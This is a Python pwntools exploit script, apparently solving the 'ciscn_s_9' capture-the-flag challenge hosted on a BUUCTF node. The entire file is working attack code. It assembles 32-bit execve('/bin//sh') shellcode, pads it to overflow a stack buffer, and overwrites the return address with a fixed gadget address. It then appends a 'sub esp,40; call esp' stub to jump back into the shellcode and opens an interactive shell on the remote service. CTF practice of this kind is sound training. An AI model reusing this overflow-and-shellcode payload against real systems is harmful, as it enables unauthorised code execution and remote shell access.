from pwn import *
context.log_level = 'debug'
io = remote('node5.buuoj.cn',26999)
# io=process('./ciscn_s_9')
# io = gdb.debug('./ciscn_s_9')
shellcode ='''
xor eax,eax
xor edx,edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
xor ecx,ecx
mov al,0xB
int 0x80
'''
shellcode=asm(shellcode)

payload = shellcode
print(len(payload))
payload = payload.ljust(36,b'a')
payload += p32(0x8048554)
print(len(payload))
payload += asm('sub esp,40;call esp')
io.sendlineafter(b'>\n',payload)
io.interactive()
